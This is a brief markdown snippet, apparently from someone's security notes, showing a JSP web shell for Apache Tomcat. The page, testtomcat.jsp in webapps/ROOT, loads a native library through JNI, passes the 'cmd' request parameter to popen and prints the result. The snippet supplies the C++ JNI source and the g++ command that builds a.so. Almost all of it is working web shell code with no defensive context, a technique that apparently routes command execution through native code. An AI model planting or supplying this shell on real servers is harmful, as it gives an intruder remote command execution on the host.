# tomcat
```
ubuntu@ubuntu:~/apache-tomcat-7.0.109/webapps/ROOT$ cat testtomcat.jsp 
<%!
    class JniCLass{
        public native String exec(String string);
        public JniCLass(){
            System.load("/opt/a.so");
        }
    }
%>

<%
    String cmd = request.getParameter("cmd");
    JniCLass a = new JniCLass();
    String res = a.exec(cmd);
    out.println(res);
%>

```

# so lib
```
#include "jni.h"
#include "org_apache_jsp_testtomcat_jsp_JniCLass.h"
#include <iostream>
#include <stdexcept>
#include <cstdio>
#include <cstring>


using namespace std;

char *runUnixCommandAndCaptureOutput(char* cmd) {
   static char buffer[33333]={0};
   FILE* pipe = popen(cmd, "r");
   fgets(buffer, 4096, pipe);
   pclose(pipe);
   return buffer;
}

JNIEXPORT jstring JNICALL Java_org_apache_jsp_testtomcat_1jsp_00024JniCLass_exec
(JNIEnv* env, jobject obj , jstring jstr) {
        char *inCStr =(char *) (env)->GetStringUTFChars(jstr, NULL);
        //char* command = (char *)(*env)->GetStringUTFChars(env, jstr, 0)
        //char* command = (char*)env->GetStringChars(jstr, 0);
        
        char* data = runUnixCommandAndCaptureOutput(inCStr);
        jstring cmdresult = (env)->NewStringUTF(data);
        return cmdresult;
}

```

g++ main.cpp -fPIC -shared -o a.so -Wreturn-local-addr
